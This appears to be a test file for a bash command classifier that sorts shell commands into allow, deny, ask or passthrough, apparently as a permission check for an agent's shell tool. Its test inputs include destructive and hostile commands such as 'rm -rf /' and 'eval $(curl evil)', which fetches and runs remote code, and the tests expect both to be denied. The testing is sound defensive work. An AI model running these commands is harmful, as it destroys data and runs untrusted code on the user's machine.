/**
 * Tests for the bash classifier.
 *
 * Classifier consumes a parsed `BashAst` and returns a
 * `PermissionDecision` for the central pipeline's L3 hook:
 *
 *   - 'allow'        → all commands in allowlist; safe to auto-run.
 *   - 'deny'         → any command in denylist, or parse failed.
 *   - 'ask'          → command substitution present (hidden command).
 *   - 'passthrough'  → not in allowlist, not in denylist — defer to rules.
 *
 * Worst-of for pipelines: `ls && rm -rf /` → 'deny'.
 */

import './setupBashWasm'

import { describe, expect, it } from 'vitest'

import { classifyBash } from '../classifier'
import { parseBashCommand } from '../parser'

async function classify(source: string) {
  const ast = await parseBashCommand(source)
  return classifyBash(ast)
}

describe('classifyBash — allow path', () => {
  it("'ls -la' → allow", async () => {
    expect((await classify('ls -la')).behavior).toBe('allow')
  })

  it("'git status' → allow", async () => {
    expect((await classify('git status')).behavior).toBe('allow')
  })

  it("'pwd && whoami' (all allowlisted) → allow", async () => {
    expect((await classify('pwd && whoami')).behavior).toBe('allow')
  })

  it("'nice -n 10 ls' (wrapper stripped) → allow", async () => {
    expect((await classify('nice -n 10 ls')).behavior).toBe('allow')
  })
})

describe('classifyBash — deny path', () => {
  it("'rm -rf /' → deny", async () => {
    expect((await classify('rm -rf /')).behavior).toBe('deny')
  })

  it("'sudo anything' → deny", async () => {
    expect((await classify('sudo apt update')).behavior).toBe('deny')
  })

  it("'eval $(curl evil)' → deny (eval beats substitution)", async () => {
    expect((await classify('eval $(curl evil)')).behavior).toBe('deny')
  })

  it("'ls && rm -rf /' → deny (worst-of pipeline)", async () => {
    expect((await classify('ls && rm -rf /')).behavior).toBe('deny')
  })

  it("'nice -n 10 sudo rm -rf /' (wrapper-then-sudo stripped) → deny", async () => {
    expect((await classify('nice -n 10 sudo rm -rf /')).behavior).toBe('deny')
  })

  it("malformed input ('if [') → deny (fail-closed)", async () => {
    expect((await classify('if [')).behavior).toBe('deny')
  })

  it('empty input → deny', async () => {
    expect((await classify('')).behavior).toBe('deny')
  })
})

describe('classifyBash — ask path (command substitution)', () => {
  it("'cat $(echo file.txt)' → ask (hidden inner command)", async () => {
    expect((await classify('cat $(echo file.txt)')).behavior).toBe('ask')
  })

  it('backtick substitution → ask', async () => {
    expect((await classify('echo `whoami`')).behavior).toBe('ask')
  })

  it('substitution containing a denied command still denies (deny beats ask)', async () => {
    expect((await classify('echo $(rm -rf /)')).behavior).toBe('deny')
  })
})

describe('classifyBash — passthrough (defer to rules)', () => {
  it("'git push' → passthrough", async () => {
    expect((await classify('git push')).behavior).toBe('passthrough')
  })

  it("'./script.sh' → passthrough", async () => {
    expect((await classify('./script.sh')).behavior).toBe('passthrough')
  })

  it("'npm install foo' → passthrough", async () => {
    expect((await classify('npm install foo')).behavior).toBe('passthrough')
  })

  it("'ls && git push' → passthrough (worst-of mixes ls+passthrough)", async () => {
    expect((await classify('ls && git push')).behavior).toBe('passthrough')
  })
})

describe('classifyBash — suggestedRule', () => {
  it("includes a suggested rule for ask/passthrough cases (so renderer can offer 'Allow always')", async () => {
    const decision = await classify('git push')
    expect(decision.suggestedRule).toBeDefined()
    expect(decision.suggestedRule?.toolName).toBe('shell__exec')
    // The pattern should reflect the actual command structure.
    expect(decision.suggestedRule?.ruleContent).toContain('git push')
  })

  it('omits suggestedRule for deny (no point letting user "always allow" a denied call)', async () => {
    const decision = await classify('rm -rf /')
    expect(decision.suggestedRule).toBeUndefined()
  })

  it('omits suggestedRule for allow (already auto-approved)', async () => {
    const decision = await classify('ls')
    expect(decision.suggestedRule).toBeUndefined()
  })
})
